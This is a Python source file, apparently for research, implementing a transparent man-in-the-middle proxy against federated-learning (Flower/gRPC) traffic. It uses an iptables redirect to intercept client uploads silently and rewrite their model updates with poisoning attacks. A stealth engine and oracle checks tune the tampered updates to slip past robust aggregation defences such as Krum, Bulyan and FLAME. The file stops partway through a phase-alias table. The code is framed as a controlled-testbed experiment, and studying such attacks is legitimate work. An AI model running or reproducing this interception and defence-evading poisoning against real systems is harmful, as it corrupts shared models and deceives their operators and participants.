#!/usr/bin/env python3
"""
TRANSPARENT FL TRAFFIC INTERCEPTOR WITH MODEL-AGNOSTIC, PHASE-GATED UPDATE-SPACE POISONING V27.1

What this version does
----------------------
1. Installs an iptables NAT PREROUTING redirect rule so FL clients can keep
   connecting to the real server address, e.g. 10.42.0.195:8080.
2. Silently redirects matching client -> server TCP connections into this local
   proxy/interceptor.
3. Relays the intercepted connection to the real FL server.
4. Detects Flower/gRPC HTTP/2 traffic and relays it transparently in raw mode.
5. Supports optional length-prefixed pickle substitution only for controlled
   custom-socket FL payloads.
6. Starts a read-only attacker-side dashboard with live interception and attack-delivery telemetry.
7. Removes the redirect rule and cleanup rules on Ctrl+C, SIGTERM, and normal exit.

Model-agnostic transport and tensor handling
--------------------------------------------
For plaintext, uncompressed Flower/gRPC traffic containing embedded NumPy arrays,
this version discovers the ordered tensor contract dynamically from shape/dtype
metadata. It does not require an RNN/CNN/autoencoder/transformer model-name
switch or a fixed tensor count. Small messages stay in RAM; large messages are
spooled to disk and patched in place. Large cached global models are deduplicated
and mmap-backed. Balanced synthetic HTTP/2 WINDOW_UPDATE credit prevents a
large upload from stalling while the proxy withholds DATA for rewriting.

The proxy still requires enough host resources to materialize the mathematical
objects needed by the chosen attack. Whole-update envelope or peer-based attacks
can require substantially more RAM than direct tensor-wise attacks. TLS or gRPC
compression prevents live tensor rewriting and therefore fails open.

Controlled-testbed example
--------------------------
Clients still connect to the real server address:
    10.42.0.195:8080

Run on the attacker/router laptop:
    sudo python3 poison_live_v24.py \
        --interface wlo1 \
        --target-server-ip 10.42.0.195 \
        --target-server-port 8080 \
        --proxy-port 9090 \
        --protocol raw \
        --client-subnet 10.42.0.0/24

Capture is enabled by default in this updated version. Use --no-capture-streams
to disable byte-stream capture.
"""

import argparse
import csv
import atexit
import html
import hashlib
import ipaddress
import json
import logging
import os
import pickle
import queue
import tempfile
import mmap
import re
import signal
import socket
import struct
import subprocess
import sys
import threading
import time
from collections import deque
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse
from dataclasses import dataclass
from pathlib import Path
from typing import Dict, List, Optional, Tuple

# NumPy is required only for live tensor rewriting. Capture-only/raw relay mode
# remains available without it.
try:
    import numpy as np
except Exception:  # pragma: no cover
    np = None


def _fallback_tensor_signature(block):
    return tuple((tuple(np.asarray(a).shape), np.asarray(a).dtype.str) for a in block)


def _fallback_signature_hash(block):
    payload = json.dumps(_fallback_tensor_signature(block), separators=(",", ":"), default=str)
    return hashlib.sha256(payload.encode("utf-8")).hexdigest()


def _fallback_clone_block(block):
    return [np.asarray(a).copy() for a in block]


def _fallback_assert_same_structure(left, right):
    if len(left) != len(right):
        raise ValueError(f"tensor count mismatch: {len(left)} != {len(right)}")
    for index, (a, b) in enumerate(zip(left, right)):
        aa = np.asarray(a); bb = np.asarray(b)
        if aa.shape != bb.shape or aa.dtype != bb.dtype:
            raise ValueError(
                f"tensor {index} structure mismatch: "
                f"{aa.shape}/{aa.dtype} != {bb.shape}/{bb.dtype}"
            )


def _fallback_assert_wire_compatible(reference, candidate):
    _fallback_assert_same_structure(reference, candidate)


def _fallback_add_blocks(left, right):
    _fallback_assert_same_structure(left, right)
    return [
        (np.asarray(a, dtype=np.float64) + np.asarray(b, dtype=np.float64)).astype(np.asarray(a).dtype)
        for a, b in zip(left, right)
    ]


def _fallback_subtract_blocks(left, right):
    _fallback_assert_same_structure(left, right)
    return [
        (np.asarray(a, dtype=np.float64) - np.asarray(b, dtype=np.float64)).astype(np.asarray(a).dtype)
        for a, b in zip(left, right)
    ]


def _fallback_block_l2_norm(block):
    return float(np.sqrt(sum(float(np.sum(np.asarray(a, dtype=np.float64) ** 2)) for a in block)))


def _fallback_block_hash(block):
    return canonical_ndarrays_sha256(block) if 'canonical_ndarrays_sha256' in globals() else _fallback_signature_hash(block)


def _fallback_block_cosine(left, right):
    _fallback_assert_same_structure(left, right)
    dot = sum(float(np.dot(np.asarray(a, dtype=np.float64).ravel(), np.asarray(b, dtype=np.float64).ravel())) for a, b in zip(left, right))
    denom = _fallback_block_l2_norm(left) * _fallback_block_l2_norm(right)
    return float(dot / denom) if denom > 0 else 0.0


def _fallback_block_distance(left, right):
    _fallback_assert_same_structure(left, right)
    return float(np.sqrt(sum(float(np.sum((np.asarray(a, dtype=np.float64) - np.asarray(b, dtype=np.float64)) ** 2)) for a, b in zip(left, right))))


def _fallback_update_metrics(block, epsilon=1e-8):
    arrays = [np.asarray(a, dtype=np.float64).ravel() for a in block]
    flat = np.concatenate(arrays) if arrays else np.asarray([], dtype=np.float64)
    if flat.size == 0:
        return {
            "dimension": 0, "l1_norm": 0.0, "l2_norm": 0.0, "max_abs": 0.0,
            "zero_fraction": 0.0, "near_zero_fraction": 0.0, "mean": 0.0,
            "std": 0.0, "minimum": 0.0, "maximum": 0.0,
            "tensor_l2_norms_json": "[]",
        }
    abs_flat = np.abs(flat)
    return {
        "dimension": int(flat.size),
        "l1_norm": float(np.sum(abs_flat)),
        "l2_norm": float(np.linalg.norm(flat)),
        "max_abs": float(np.max(abs_flat)),
        "zero_fraction": float(np.mean(flat == 0.0)),
        "near_zero_fraction": float(np.mean(abs_flat <= float(epsilon))),
        "mean": float(np.mean(flat)),
        "std": float(np.std(flat)),
        "minimum": float(np.min(flat)),
        "maximum": float(np.max(flat)),
        "tensor_l2_norms_json": json.dumps([float(np.linalg.norm(a)) for a in arrays], separators=(",", ":")),
    }


# Array-contract operations are independent of the envelope stealth engine.
# Direct attacks remain available even if stealth_engine is not installed.
try:
    from array_contract import (
        add_blocks as _add_blocks,
        assert_same_structure as _assert_same_structure,
        assert_wire_compatible as _assert_wire_compatible,
        block_hash as _block_hash,
        block_l2_norm as _block_l2_norm,
        clone_block as _clone_block,
        cosine_similarity as _block_cosine_similarity,
        euclidean_distance as _block_euclidean_distance,
        signature_hash as _signature_hash,
        subtract_blocks as _subtract_blocks,
        tensor_signature as _tensor_signature,
    )
    _ARRAY_CONTRACT_AVAILABLE = True
except Exception:  # pragma: no cover
    _add_blocks = _fallback_add_blocks
    _assert_same_structure = _fallback_assert_same_structure
    _assert_wire_compatible = _fallback_assert_wire_compatible
    _block_hash = _fallback_block_hash
    _block_l2_norm = _fallback_block_l2_norm
    _clone_block = _fallback_clone_block
    _block_cosine_similarity = _fallback_block_cosine
    _block_euclidean_distance = _fallback_block_distance
    _signature_hash = _fallback_signature_hash
    _subtract_blocks = _fallback_subtract_blocks
    _tensor_signature = _fallback_tensor_signature
    _ARRAY_CONTRACT_AVAILABLE = np is not None


try:
    from stealth_engine import (
        cleanup_manager_cache as _cleanup_stealth_manager_cache,
        flush_manager_state as _flush_stealth_manager_state,
        get_client_engine as _get_client_stealth_engine,
        manager_snapshot as _stealth_manager_snapshot,
        update_metrics as _update_metrics,
    )
    _STEALTH_AVAILABLE = True
    _STEALTH_IMPORT_ERROR = ""
except Exception as _stealth_exc:  # pragma: no cover
    _cleanup_stealth_manager_cache = None
    _flush_stealth_manager_state = None
    _get_client_stealth_engine = None
    _stealth_manager_snapshot = None
    _update_metrics = _fallback_update_metrics if np is not None else None
    _STEALTH_AVAILABLE = False
    _STEALTH_IMPORT_ERROR = repr(_stealth_exc)

try:
    from peer_fingerprint import observe_peer_update as _observe_peer_update
    _PEER_FINGERPRINT_AVAILABLE = True
    _PEER_FINGERPRINT_IMPORT_ERROR = ""
except Exception as _peer_exc:  # pragma: no cover
    _observe_peer_update = None
    _PEER_FINGERPRINT_AVAILABLE = False
    _PEER_FINGERPRINT_IMPORT_ERROR = repr(_peer_exc)


from experiment_integrity import (
    CANONICAL_HASH_SCHEME,
    ResourceCSVMonitor,
    atomic_json_dump,
    canonical_ndarrays_sha256,
    collect_code_fingerprints,
    optional_file_sha256,
    runtime_environment_snapshot,
)

from model_agnostic_support import (
    MODEL_CONTRACT_HASH_SCHEME,
    AdaptiveOutputQueue,
    FlowControlBridge,
    MessageSizePolicy,
    build_http2_frame_header as _support_build_http2_frame_header,
    build_window_update_frame,
    contract_summary_fields,
    tensor_contract,
)

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("transparent_poison_proxy")


_DASHBOARD_STATE = None
_DASHBOARD_GLOBAL_LOCK = threading.RLock()
_ATTACK_EVENT_LOGGER = None
_ATTACK_EVENT_LOGGER_LOCK = threading.RLock()

_ANALYZER_POISON_TARGETS: Dict[str, dict] = {}
_ANALYZER_POISON_TARGETS_LOCK = threading.RLock()


def _clean_ip_token(value: object) -> str:
    return str(value or "").strip()


def authorize_analyzer_poison_target(client_ip: object, ttl_s: object = 8.0, source: object = "analyzer", round_value: object = "") -> None:
    """Temporarily authorize a client from an analyzer apply_poison/poison_trigger signal.

    This makes the analyzer decision a target authorization, not only a phase-gate
    signal. It prevents the proxy from opening the phase gate but then rejecting the
    same client as `client_not_targeted` when static --poison-clients is absent or
    stale.
    """
    ip = _clean_ip_token(client_ip)
    if not ip:
        return
    try:
        ttl = float(ttl_s)
    except Exception:
        ttl = 8.0
    if ttl <= 0.0:
        ttl = 8.0
    expires_at = time.time() + ttl
    with _ANALYZER_POISON_TARGETS_LOCK:
        _ANALYZER_POISON_TARGETS[ip] = {
            "expires_at": float(expires_at),
            "ttl_s": float(ttl),
            "source": str(source or "analyzer"),
            "round": round_value,
            "authorized_at": time.time(),
        }


def analyzer_poison_target_status(client_ip: object) -> Tuple[bool, dict]:
    ip = _clean_ip_token(client_ip)
    if not ip:
        return False, {}
    now = time.time()
    with _ANALYZER_POISON_TARGETS_LOCK:
        # Opportunistic pruning keeps the table bounded and prevents stale targets.
        stale = [key for key, meta in _ANALYZER_POISON_TARGETS.items() if float(meta.get("expires_at", 0.0)) <= now]
        for key in stale:
            _ANALYZER_POISON_TARGETS.pop(key, None)
        meta = dict(_ANALYZER_POISON_TARGETS.get(ip, {}))
    if not meta:
        return False, {}
    remaining = max(0.0, float(meta.get("expires_at", 0.0)) - now)
    if remaining <= 0.0:
        return False, {}
    meta["ttl_remaining_s"] = remaining
    return True, meta


def _target_tokens(value: str) -> set:
    return {str(item).strip() for item in str(value or "").split(",") if str(item).strip()}


def poison_target_decision(client_ip: object, args: argparse.Namespace) -> Tuple[bool, str, dict]:
    """Return (targeted, target_source, metadata) for a client upload.

    Correct analyzer/proxy separation:
      - The analyzer reports per-client status, for example
        client_ip=10.42.0.210, phase=UPLOAD/MODEL_UPLOAD.
      - The proxy owns the attack target set. It compares the intercepted
        client IP against --poison-clients / the interactive CSV target list.
      - The phase gate separately checks that the *same* client currently has
        a fresh analyzer MODEL_UPLOAD signal before any update is modified.

    Therefore an analyzer signal by itself does NOT make a client an attack
    target. It only says whether that client is in the right phase. This avoids
    accidentally poisoning every client when the analyzer publishes status for
    all participating clients.
    """
    ip = _clean_ip_token(client_ip)
    mode = str(getattr(args, "poison_target_mode", "static") or "static").strip().lower()
    tokens = _target_tokens(getattr(args, "poison_clients", ""))
    normalized_tokens = {t.lower() for t in tokens}

    if mode in {"all", "poison_all"} or "all" in normalized_tokens or "*" in normalized_tokens:
        return True, "static_all_clients", {"mode": mode, "target_list_size": len(tokens)}

    if not tokens:
        # Safe default for analyzer-status feeds: the analyzer publishes all
        # clients, so a blank list must not mean "attack whoever is uploading".
        return False, "no_attack_target_configured", {"mode": mode, "target_list_size": 0}

    if ip in tokens:
        return True, "static_poison_clients", {"mode": mode, "target_list_size": len(tokens)}

    return False, "not_in_static_targets", {"mode": mode, "target_list_size": len(tokens)}


ATTACK_EVENT_FIELDS = [
    "timestamp", "ts_wall", "proxy_run_id", "experiment_id", "run_id",
    "condition", "event_type", "direction", "stream_id",
    "fl_round", "fl_phase", "phase_confidence", "phase_source",
    "client_ip", "targeted", "target_source", "poison_target_mode", "active_analyzer_target",
    "grpc_message_size_bytes", "rewrite_processing_duration_s", "max_message_mb_configured",
    "message_size_policy", "adaptive_hard_limit_bytes", "transport_buffer_mode",
    "transport_spooled_to_disk", "transport_spool_bytes",
    "flow_control_synthetic_credit_bytes", "flow_control_server_credit_suppressed_bytes",
    "analyzer_target_ttl_remaining_s", "grpc_message_index", "selected_for_attack",
    "modified", "modification_reason", "attack_type", "raw_attack",
    "effective_attack_name", "clip_ratio",
    "alpha", "sigma", "aggressiveness", "warmup_configured",
    "warmup_rounds_configured", "warmup_round_number", "warmup_round_hold_active",
    "attack_phase", "engine_observed", "engine_poisoned",
    "arrays_found_in_message", "arrays_modified_in_message",

    # Phase-gating evidence.
    "phase_gate_enabled", "phase_gate_open", "phase_gate_reason",
    "phase_gate_required_phase", "phase_gate_min_confidence",
    "phase_gate_max_age_s", "phase_prediction_age_s",
    "phase_prediction_client_ip", "phase_prediction_round",
    "phase_prediction_scope", "phase_client_match",
    "phase_source_allowed",

    # Download/upload matching and update-space evidence.
    "update_space_required", "update_space_used", "global_model_cached",
    "global_model_matched", "global_model_match_method",
    "global_model_age_s", "global_model_round",
    "global_model_message_index", "global_model_stream_id",
    "global_model_phase_qualified", "global_model_phase_at_cache",
    "global_model_cache_source", "global_model_match_valid",
    "global_model_phase_status", "model_cache_candidates",
    "global_model_hash", "local_model_hash", "poisoned_model_hash",
    "global_model_contract_sha256", "global_model_tensor_count",
    "global_model_total_bytes", "global_model_storage_mode",
    "canonical_hash_scheme", "genuine_update_sha256",
    "raw_poison_update_sha256", "projected_update_sha256",
    "reconstructed_model_sha256",
    "tensor_signature_hash", "tensor_count", "update_dimension",
    "model_contract_hash_scheme", "model_contract_sha256",
    "model_contract_tensor_count", "model_contract_total_elements",
    "model_contract_total_bytes", "model_contract_shapes_json",
    "model_contract_dtypes_json",
    "reconstruction_valid", "finite_values_valid", "wire_compatible",

    # Genuine-update geometry.
    "genuine_update_l1_norm", "genuine_update_l2_norm",
    "genuine_update_max_abs", "genuine_update_zero_fraction",
    "genuine_update_near_zero_fraction", "genuine_update_mean",
    "genuine_update_std", "genuine_update_minimum",
    "genuine_update_maximum", "genuine_tensor_l2_norms_json",
    "distance_to_previous_genuine_update",
    "cosine_to_previous_genuine_update", "genuine_update_norm_change",
    "genuine_update_norm_change_ratio",

    # Raw/projected attack geometry.
    "raw_poison_update_l1_norm", "raw_poison_update_l2_norm",
    "raw_poison_update_max_abs", "raw_poison_update_near_zero_fraction",
    "distance_genuine_to_raw_poison", "cosine_genuine_to_raw_poison",
    "projected_update_l1_norm", "projected_update_l2_norm",
    "projected_update_max_abs", "projected_update_zero_fraction",
    "projected_update_near_zero_fraction",
    "projected_tensor_l2_norms_json",
    "distance_genuine_to_projected_update",
    "cosine_genuine_to_projected_update",
    "projected_to_genuine_norm_ratio", "reconstructed_model_l2_norm",

    # Benign-envelope and peer-learning evidence.
    "envelope_observations", "warmup_complete", "engine_decision",
    "engine_model_contract_sha256", "engine_round_index",
    "active_defense", "oracle_evaluated_defenses",
    "geometry_sketch_dim_configured", "state_persistence_enabled",
    "peer_observation_recorded", "peer_observation_reason",
    "peer_observation_error", "peer_contract_sha256",
    "peer_observation_storage_mode", "peer_observation_sketch_dimensions",
    "peer_registry_total_bytes", "peer_registry_total_mb",
    "peer_client_count", "peer_full_block_client_count",
    "peer_sketch_only_client_count", "peer_envelope_observations", "peer_mode",
    "peer_geometry_mode", "peer_geometry_dimensions", "peer_geometry_rows",
    "peer_geometry_peer_ids",
    "peer_envelope_requested_round", "peer_envelope_selected_round",
    "peer_envelope_round_source", "peer_envelope_required_client_count",
    "peer_envelope_selected_client_count",
    "peer_geometry_requested_round", "peer_geometry_selected_round",
    "peer_geometry_round_source", "peer_geometry_required_client_count",
    "peer_geometry_selected_client_count",
    "peer_full_geometry_requested_round", "peer_full_geometry_selected_round",
    "peer_full_geometry_round_source", "peer_full_geometry_required_client_count",
    "peer_full_geometry_selected_client_count",
    "selection_attack_feasible", "selection_feasible", "selection_reason",
    "selection_configured_active_defense", "selection_strength",
    "selection_gamma_boundary", "selection_gamma",
    "selection_gamma_over_peer_scale", "selection_peer_mean_norm",
    "selection_gamma_over_peer_mean_norm", "selection_harmful_direction_crossed",
    "selection_malicious_krum_score", "selection_min_peer_krum_score",
    "selection_selection_rank_low", "selection_selection_size",
    "selection_cosine_to_peer_mean", "selection_boundary_mode",
    "selection_boundary_threshold", "selection_boundary_distance_power",
    "oracle_any_flagged", "oracle_geometry_mode", "oracle_geometry_dimensions",
    "oracle_coordinate_containment", "oracle_cosine_to_peer_mean",
    "oracle_norm_in_band", "adaptive_final_aggressiveness",
    "oracle_krum_flagged", "oracle_krum_selected",
    "oracle_multi_krum_flagged", "oracle_multi_krum_selected",
    "oracle_median_flagged", "oracle_trimmed_mean_flagged",
    "oracle_bulyan_flagged", "oracle_bulyan_selected",
    "oracle_flame_flagged", "oracle_flame_selected",
    "envelope_coordinate_containment_fraction",
    "envelope_norm_containment_fraction",
    "envelope_mean_direction_cosine",
    "envelope_global_norm_contained", "envelope_global_direction_cosine",
    "projection_working_dtype",
    "event_log_source",
]


class AttackEventLogger:
    """Thread-safe proxy ground-truth and diagnostic logger."""

    def __init__(self, path: str, args: argparse.Namespace):
        self.path = Path(path).expanduser().resolve()
        self.path.parent.mkdir(parents=True, exist_ok=True)
        self.args = args
        self.lock = threading.RLock()
        self.proxy_run_id = str(getattr(args, "proxy_run_id", "") or f"proxy_{int(time.time())}")
        is_new = not self.path.exists() or self.path.stat().st_size == 0
        self.handle = self.path.open("a", newline="", encoding="utf-8", buffering=1)
        self.writer = csv.DictWriter(
            self.handle, fieldnames=ATTACK_EVENT_FIELDS, extrasaction="ignore"
        )
        if is_new:
            self.writer.writeheader()
            self.handle.flush()

    @staticmethod
    def _safe_round(value):
        try:
            return int(value)
        except Exception:
            return ""

    def log_message(
        self,
        *,
        client_ip: str,
        message_index: int,
        targeted: bool,
        selected_for_attack: bool,
        modified: bool,
        modification_reason: str,
        arrays_modified_in_message: int = 0,
        arrays_found_in_message: int = 0,
        stream_id: int = 0,
        details: Optional[dict] = None,
    ) -> None:
        details = dict(details or {})
        snapshot = {}
        dashboard = _get_dashboard_state()
        if dashboard is not None:
            try:
                snapshot = dashboard.snapshot()
            except Exception:
                snapshot = {}
        fl_phase = snapshot.get("fl_phase", {}) if isinstance(snapshot, dict) else {}
        attack = snapshot.get("attack", {}) if isinstance(snapshot, dict) else {}
        engine = snapshot.get("engine", {}) if isinstance(snapshot, dict) else {}
        now = time.time()
        row = {field: "" for field in ATTACK_EVENT_FIELDS}
        row.update({
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S", time.localtime(now)),
            "ts_wall": f"{now:.6f}",
            "proxy_run_id": self.proxy_run_id,
            "experiment_id": str(getattr(self.args, "experiment_id", "") or ""),
            "run_id": str(getattr(self.args, "run_id", "") or ""),
            "condition": str(getattr(self.args, "condition", "") or ""),
            "event_type": "upload_decision",
            "direction": "client_to_server",
            "stream_id": int(stream_id or 0),
            "fl_round": self._safe_round(details.get("fl_round", fl_phase.get("round", ""))),
            "fl_phase": str(details.get("fl_phase", fl_phase.get("current", "")) or ""),
            "phase_confidence": details.get("phase_confidence", fl_phase.get("confidence", "")),
            "phase_source": str(details.get("phase_source", fl_phase.get("source", "")) or ""),
            "client_ip": str(client_ip or ""),
            "targeted": int(bool(targeted)),
            "target_source": str(details.get("target_source", "") or ""),
            "poison_target_mode": str(details.get("poison_target_mode", "") or ""),
            "active_analyzer_target": int(bool(details.get("active_analyzer_target", 0))),
            "grpc_message_size_bytes": details.get("grpc_message_size_bytes", ""),
            "rewrite_processing_duration_s": details.get("rewrite_processing_duration_s", ""),
            "max_message_mb_configured": int(getattr(self.args, "max_message_mb", 0) or 0),
            "analyzer_target_ttl_remaining_s": details.get("analyzer_target_ttl_remaining_s", ""),
            "grpc_message_index": int(message_index),
            "selected_for_attack": int(bool(selected_for_attack)),
            "modified": int(bool(modified)),
            "modification_reason": str(modification_reason or ""),
            "attack_type": str(getattr(self.args, "live_attack", "") or ""),
            "raw_attack": str(getattr(self.args, "live_raw_attack", "") or ""),
            "effective_attack_name": (
                "norm_constrained_sign_flip"
                if str(getattr(self.args, "live_attack", "") or "").lower() == "clip"
                else str(getattr(self.args, "live_attack", "") or "")
            ),
            "clip_ratio": getattr(self.args, "live_clip_ratio", ""),
            "alpha": getattr(self.args, "live_alpha", ""),
            "sigma": getattr(self.args, "live_sigma", ""),
            "aggressiveness": getattr(self.args, "live_aggressiveness", ""),
            "warmup_configured": getattr(self.args, "live_warmup", ""),
            "warmup_rounds_configured": getattr(self.args, "live_warmup_rounds", ""),
            "warmup_round_number": details.get("warmup_round_number", ""),
            "warmup_round_hold_active": details.get("warmup_round_hold_active", ""),
            "attack_phase": str(attack.get("phase", "") or ""),
            "engine_observed": engine.get("observed", engine.get("observed_blocks", engine.get("num_observed", ""))),
            "engine_poisoned": engine.get("poisoned", engine.get("poisoned_blocks", engine.get("num_poisoned", ""))),
            "arrays_found_in_message": int(arrays_found_in_message or 0),
            "arrays_modified_in_message": int(arrays_modified_in_message or 0),
            "update_space_required": int(bool(getattr(self.args, "require_update_space", True))),
            "canonical_hash_scheme": CANONICAL_HASH_SCHEME,
            "event_log_source": "proxy_actual_delivery",
        })
        for key, value in details.items():
            if key in row:
                row[key] = _json_safe(value)
        with self.lock:
            self.writer.writerow(row)
            self.handle.flush()


def _set_attack_event_logger(logger_obj) -> None:
    global _ATTACK_EVENT_LOGGER
    with _ATTACK_EVENT_LOGGER_LOCK:
        _ATTACK_EVENT_LOGGER = logger_obj


def _get_attack_event_logger():
    with _ATTACK_EVENT_LOGGER_LOCK:
        return _ATTACK_EVENT_LOGGER


def _set_dashboard_state(state) -> None:
    global _DASHBOARD_STATE
    with _DASHBOARD_GLOBAL_LOCK:
        _DASHBOARD_STATE = state


def _get_dashboard_state():
    with _DASHBOARD_GLOBAL_LOCK:
        return _DASHBOARD_STATE


def _as_probability(value) -> Optional[float]:
    try:
        number = float(value)
    except Exception:
        return None
    if not (number == number) or number < 0.0:
        return None
    if number > 1.0 and number <= 100.0:
        number /= 100.0
    return min(1.0, max(0.0, number))


def _phase_snapshot_for_client(client_ip: str, allow_global: bool = True) -> dict:
    """Return the freshest detector record without exposing server metrics."""
    state = _get_dashboard_state()
    now = time.time()
    if state is None:
        return {"phase": "UNKNOWN", "age_s": None, "scope": "none"}
    try:
        with state.lock:
            client_record = dict(state.client_phase_state.get(str(client_ip), {}) or {})
            if client_record:
                updated = float(client_record.get("updated_at", now) or now)
                return {
                    "phase": _normalize_fl_phase(client_record.get("phase", "UNKNOWN")),
                    "round": client_record.get("round", ""),
                    "confidence": _as_probability(client_record.get("confidence")),
                    "source": str(client_record.get("source", "") or ""),
                    "client_ip": str(client_ip or ""),
                    "age_s": max(0.0, now - updated),
                    "ttl_s": client_record.get("ttl_s", ""),
                    "scope": "client",
                }
            if allow_global:
                global_record = dict(state.sniffer_metadata or {})
                updated = float(state.sniffer_metadata_at or 0.0)
                return {
                    "phase": _normalize_fl_phase(global_record.get("phase", "UNKNOWN")),
                    "round": global_record.get("round", ""),
                    "confidence": _as_probability(global_record.get("confidence")),
                    "source": str(global_record.get("phase_source", "") or ""),
                    "client_ip": str(global_record.get("client_ip", "") or ""),
                    "age_s": max(0.0, now - updated) if updated > 0 else None,
                    "ttl_s": global_record.get("ttl_s", ""),
                    "scope": "global",
                }
    except Exception:
        pass
    return {"phase": "UNKNOWN", "age_s": None, "scope": "none"}


def evaluate_phase_gate(args: argparse.Namespace, client_ip: str, required_phase: str = "MODEL_UPLOAD") -> Tuple[bool, str, dict]:
    enabled = bool(getattr(args, "phase_gate_enabled", True))
    allow_global = not bool(getattr(args, "phase_gate_require_client", True))
    snapshot = _phase_snapshot_for_client(client_ip, allow_global=allow_global)
    phase = _normalize_fl_phase(snapshot.get("phase", "UNKNOWN"))
    confidence = snapshot.get("confidence")
    age = snapshot.get("age_s")
    source = str(snapshot.get("source", "") or "")
    rejected_sources = {
        item.strip().lower()
        for item in str(getattr(args, "phase_gate_reject_sources", "server_announce") or "").split(",")
        if item.strip()
    }
    minimum = float(getattr(args, "phase_gate_min_confidence", 0.85))
    configured_maximum_age = float(getattr(args, "phase_gate_max_age_s", 90.0))
    trigger_ttl = snapshot.get("ttl_s", "")
    try:
        ttl_age = float(trigger_ttl)
    except (TypeError, ValueError):
        ttl_age = 0.0
    maximum_age = ttl_age if ttl_age > 0.0 else configured_maximum_age
    source_allowed = not any(token in source.lower() for token in rejected_sources)
    client_match = snapshot.get("scope") == "client" or (
        not bool(getattr(args, "phase_gate_require_client", True))
    )

    details = {
        "phase_gate_enabled": int(enabled),
        "phase_gate_required_phase": required_phase,
        "phase_gate_min_confidence": minimum,
        "phase_gate_max_age_s": maximum_age,
        "phase_prediction_age_s": age if age is not None else "",
        "phase_prediction_client_ip": snapshot.get("client_ip", ""),
        "phase_prediction_round": snapshot.get("round", ""),
        "phase_prediction_scope": snapshot.get("scope", "none"),
        "phase_client_match": int(bool(client_match)),
        "phase_source_allowed": int(bool(source_allowed)),
        "fl_round": snapshot.get("round", ""),
        "fl_phase": phase,
        "phase_confidence": confidence if confidence is not None else "",
        "phase_source": source,
    }
    if not enabled:
        details.update({"phase_gate_open": 1, "phase_gate_reason": "gate_disabled"})
        return True, "gate_disabled", details

    if phase != required_phase:
        details.update({"phase_gate_open": 0, "phase_gate_reason": f"phase_not_{required_phase}"})
        return False, f"phase_not_{required_phase}", details

    # Confidence is ADVISORY ONLY and never blocks.
    #
    # Architectural rationale: the analyzer performs the full confidence
    # assessment upstream (upload_score vs candidate/confirmed thresholds, hard
    # packet/phase evidence, and a temporal hold) and only emits the
    # `apply_poison` command once every one of those gates has cleared. It sends
    # a *decision* (the command + phase), not a confidence scalar for the proxy
    # to re-judge. Re-imposing a confidence threshold here would re-litigate a
    # decision already made with more signal than the proxy has, and — because
    # the analyzer deliberately omits any confidence field — would reject every
    # genuinely-confident trigger (the `confidence is None` block). We therefore
    # record confidence when present but never gate on it.
    if confidence is not None:
        try:
            if float(confidence) < minimum:
                details["phase_confidence_below_advisory_threshold"] = 1
        except (TypeError, ValueError):
            pass

    if not bool(getattr(args, "phase_gate_ignore_age", False)):
        if age is None or float(age) > maximum_age:
            details.update({"phase_gate_open": 0, "phase_gate_reason": "phase_prediction_stale"})
            return False, "phase_prediction_stale", details

    if not client_match:
        details.update({"phase_gate_open": 0, "phase_gate_reason": "client_phase_mismatch"})
        return False, "client_phase_mismatch", details

    if not source_allowed:
        details.update({"phase_gate_open": 0, "phase_gate_reason": "phase_source_rejected"})
        return False, "phase_source_rejected", details

    # Initial round-level warm-up applies to every direct update-space attack
    # (clip, sign_flip, scale, noise, zero) as well as envelope.  Earlier
    # versions only used --live-warmup inside the envelope engine, which meant
    # direct attacks began as soon as the first MODEL_UPLOAD signal appeared.
    # Here, --live-warmup-rounds blocks poisoning for the first K FL rounds
    # based on the analyzer's per-client round/round_id value.
    warmup_rounds = max(0, int(getattr(args, "live_warmup_rounds", 0) or 0))
    round_number = _coerce_round_number(snapshot.get("round", ""))
    details["warmup_rounds_configured"] = warmup_rounds
    details["warmup_round_number"] = round_number if round_number is not None else ""
    details["warmup_round_hold_active"] = 0
    if warmup_rounds > 0:
        if round_number is None:
            details.update({
                "warmup_round_hold_active": 1,
                "phase_gate_open": 0,
                "phase_gate_reason": "warmup_round_unknown",
            })
            return False, "warmup_round_unknown", details
        if round_number <= warmup_rounds:
            details.update({
                "warmup_round_hold_active": 1,
                "phase_gate_open": 0,
                "phase_gate_reason": "warmup_round_hold",
            })
            return False, "warmup_round_hold", details

    details.update({"phase_gate_open": 1, "phase_gate_reason": "analyzer_upload_phase"})
    return True, "analyzer_upload_phase", details


def _safe_number(value, default=0):
    try:
        return int(value)
    except Exception:
        try:
            return float(value)
        except Exception:
            return default


def _coerce_round_number(value: object):
    """Return an integer round number when the analyzer supplied one.

    Analyzer implementations may send round values as integers, floats,
    strings ("4"), or labels ("round=4", "round_4").  Returning
    None means the value is missing or cannot be trusted for warm-up gating.
    """
    if value is None or value == "":
        return None
    if isinstance(value, bool):
        return None
    try:
        number = float(value)
        if number == number and abs(number) != float("inf"):
            return int(number)
    except Exception:
        pass
    text = str(value).strip()
    if not text:
        return None
    match = re.search(r"-?\d+", text)
    if not match:
        return None
    try:
        return int(match.group(0))
    except Exception:
        return None


def _json_safe(value):
    if value is None or isinstance(value, (str, int, float, bool)):
        return value
    if isinstance(value, dict):
        return {str(k): _json_safe(v) for k, v in value.items()}
    if isinstance(value, (list, tuple, set)):
        return [_json_safe(v) for v in value]
    return str(value)


class DashboardLogHandler(logging.Handler):
    """Copies proxy log records into the in-memory attacker event stream."""

    def emit(self, record) -> None:
        state = _get_dashboard_state()
        if state is None:
            return
        try:
            state.add_event(
                level=record.levelname,
                message=self.format(record),
                created=float(record.created),
            )
        except Exception:
            pass


def _normalize_fl_phase(value: object) -> str:
    """Normalize phase labels from different detector implementations."""
    raw = str(value or "").strip()
    if not raw:
        return "UNKNOWN"

    compact = (
        raw.lower()
        .replace("-", "_")
        .replace(" ", "_")
        .replace("/", "_")
    )
    aliases = {
        "modeldown": "MODEL_DOWNLOAD",
        "model_down": "MODEL_DOWNLOAD",
        "download": "MODEL_DOWNLOAD",
        "global_model_download": "MODEL_DOWNLOAD",
        "server_to_client": "MODEL_DOWNLOAD",
        "downlink": "MODEL_DOWNLOAD",

        "modeltrain": "LOCAL_TRAINING",
        "model_train": "LOCAL_TRAINING",
        "train": "LOCAL_TRAINING",
        "training": "LOCAL_TRAINING",
        "fit": "LOCAL_TRAINING",
        "local_fit": "LOCAL_TRAINING",
        "local_training": "LOCAL_TRAINING",

        "modelevaluate": "LOCAL_EVALUATION",
        "model_evaluate": "LOCAL_EVALUATION",
        "evaluate": "LOCAL_EVALUATION",
